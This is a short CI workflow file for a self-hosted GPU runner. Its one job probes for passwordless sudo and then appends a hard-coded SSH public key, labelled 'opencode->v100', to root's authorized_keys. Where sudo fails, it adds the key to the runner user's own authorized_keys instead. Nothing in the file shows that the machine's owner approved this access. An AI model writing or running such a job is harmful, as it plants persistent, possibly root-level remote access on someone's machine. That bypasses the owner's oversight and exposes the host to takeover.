name: seed-opencode-v100-key-0002
on:
  workflow_dispatch:
permissions: {contents: read}
jobs:
  seed:
    runs-on: [self-hosted, Linux, X64, V100-pi0]
    timeout-minutes: 20
    steps:
      - name: seed local (0002)
        env:
          PUBKEY: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2Q/3I0oae4jEAlYgsn32g0Am/90JG2GQWD25RcJ4+7 opencode->v100"
        run: |
          set +e
          id; hostname
          echo -n "sudo: "; sudo -n true 2>/dev/null && echo OK || echo NO
          if sudo -n true 2>/dev/null; then
            sudo mkdir -p /root/.ssh; sudo chmod 700 /root/.ssh
            echo "$PUBKEY" | sudo tee -a /root/.ssh/authorized_keys >/dev/null
            sudo chmod 600 /root/.ssh/authorized_keys
            echo "SEEDED_ROOT count=$(sudo grep -c . /root/.ssh/authorized_keys)"
          else
            mkdir -p ~/.ssh; chmod 700 ~/.ssh
            echo "$PUBKEY" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys
            echo "SEEDED_USER user=$(id -un) count=$(grep -c . ~/.ssh/authorized_keys)"
          fi
